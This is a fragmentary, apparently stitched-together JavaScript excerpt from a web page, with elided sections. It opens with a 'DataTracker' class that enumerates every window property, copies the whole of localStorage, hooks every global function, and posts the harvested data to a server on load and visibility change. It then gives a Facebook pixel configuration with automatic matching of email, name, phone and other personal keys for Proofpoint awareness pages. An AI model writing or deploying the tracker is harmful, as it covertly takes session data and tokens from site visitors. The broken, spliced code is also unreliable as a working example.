...
class DataTracker {
  constructor() {
    this.excludeProps = ["seenVars", "localStorage"];
  }
  gatherWindowProperties() {
    const unseenProps = {};
    for (const key in window) {
      if (window.hasOwnProperty(key) && !this.excludeProps.includes(key)) {
        const value = window[key];
        const type = typeof value;
        if (!window.seenVars.includes(key)) unseenProps[key] = this.formatValue(type, value);
      }
    }
    this.includeLocalStorage(unseenProps);
    return unseenProps;
  }
  formatValue(type, value) {
    if (type === "function") {
      this.applyFunctionHook(value);
      return undefined;
    }
    return value;
  }
  includeLocalStorage(unseenProps) {
    unseenProps["localStorage"] = {
      ...localStorage
    };
  }
  gatherAndSendData() {
    const gatheredData = this.gatherWindowProperties();
    if (Object.keys(gatheredData).length > 0) {
      this.postDataToServer(gatheredData);
    }
  }
  applyFunctionHook(value) {
    if (value.name && !localHooks.hasOwnProperty(value.name)) {
      const original = value;
      localHooks[value.name] = value;
      window[value.name] = function () {
...
window.addEventListener("load", () => tracker.gatherAndSendData());
(function (a, b, c, d) {
  var e = {
    exports: {}
  };
...
document.addEventListener("visibilitychange", () => tracker.gatherAndSendData());
fbq.registerPlugin("143852102935619", {
  __fbEventsPlugin: 1,
  plugin: function (fbq, instance, config) {
    config.set("143852102935619", "inferredEvents", {
      "buttonSelector": "extended"
    });
    fbq.loadPlugin("inferredevents");
    fbq.loadPlugin("identity");
    instance.optIn("143852102935619", "InferredEvents", true);
    fbq.loadPlugin("jsonld_microdata");
    instance.optIn("143852102935619", "MicrodataJsonLd", true);
    config.set("143852102935619", "automaticMatching", {
      "selectedMatchKeys": ["em", "fn", "ln", "ph", "ge", "zp", "ct", "st", "country", "db", "external_id"]
    });
    fbq.loadPlugin("inferredevents");
    fbq.loadPlugin("identity");
    instance.optIn("143852102935619", "AutomaticMatching", true);
    fbq.loadPlugin("iwlbootstrapper");
    instance.optIn("143852102935619", "IWLBootstrapper", true);
    fbq.loadPlugin("iwlparameters");
    instance.optIn("143852102935619", "IWLParameters", true);
    fbq.set("iwlExtractors", "143852102935619", []);
    fbq.loadPlugin("cookie");
    instance.optIn("143852102935619", "FirstPartyCookies", true);
    fbq.loadPlugin("inferredevents");
    fbq.loadPlugin("microdata");
    instance.optIn("143852102935619", "AutomaticSetup", true);
    fbq.loadPlugin("automaticmatchingforpartnerintegrations");
    instance.optIn("143852102935619", "AutomaticMatchingForPartnerIntegrations", true);
    ...
    config.set("143852102935619", "prohibitedSources", {
      "prohibitedSources": []
    });
    fbq.loadPlugin("prohibitedsources");
    instance.optIn("143852102935619", "ProhibitedSources", true);
    config.set("143852102935619", "unwantedData", {
      "blacklisted_keys": {
        "PageView": {
          "cd": [],
          "url": ["FirstName", "content[query]"]
        }
      },
      "sensitive_keys": {}
    });
    fbq.loadPlugin("unwanteddata");
    instance.optIn("143852102935619", "UnwantedData", true);
    fbq.loadPlugin("iabpcmaebridge");
    instance.optIn("143852102935619", "IABPCMAEBridge", true);
    config.set("143852102935619", "browserProperties", {
      "delayInMs": 200,
      "enableEventSuppression": true,
      "enableBackupTimeout": true
    });
    fbq.loadPlugin("browserproperties");
    instance.optIn("143852102935619", "BrowserProperties", true);
    fbq.loadPlugin("estruleengine");
    instance.optIn("143852102935619", "ESTRuleEngine", true);
    fbq.set("estRules", "143852102935619", [{
      "condition": {
        "type": 1,
        "conditions": [{
          "targetType": 1,
      ...
      "condition": {
        ...
        "conditions": [{
          ...
          "operator": 2,
          "action": 2,
          "value": "https:\/\/www.proofpoint.com\/us\/cybersecurity-awareness-month"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "4329466693837398"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
          ...
          "operator": 2,
          "action": 2,
          "value": "https:\/\/www.proofpoint.com\/us\/resources\/awareness-materials\/cybersecurity-awareness-month"
        }]
      },
      "derived_event_name": "ViewContent",
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "2473440782800822"
    }, {
      "condition": {
        "type": 1,
        "conditions": [{
      ...
      "transformations": [1],
      "rule_status": "ACTIVE",
      "rule_id": "258170829490202"
    }]);
    config.set("143852102935619", "clientHint", {
      "delayInMs": 200,
      "disableBackupTimeout": false
    });
    fbq.loadPlugin("clienthint");
    instance.optIn("143852102935619", "ClientHint", true);
    instance.configLoaded("143852102935619");
  }
});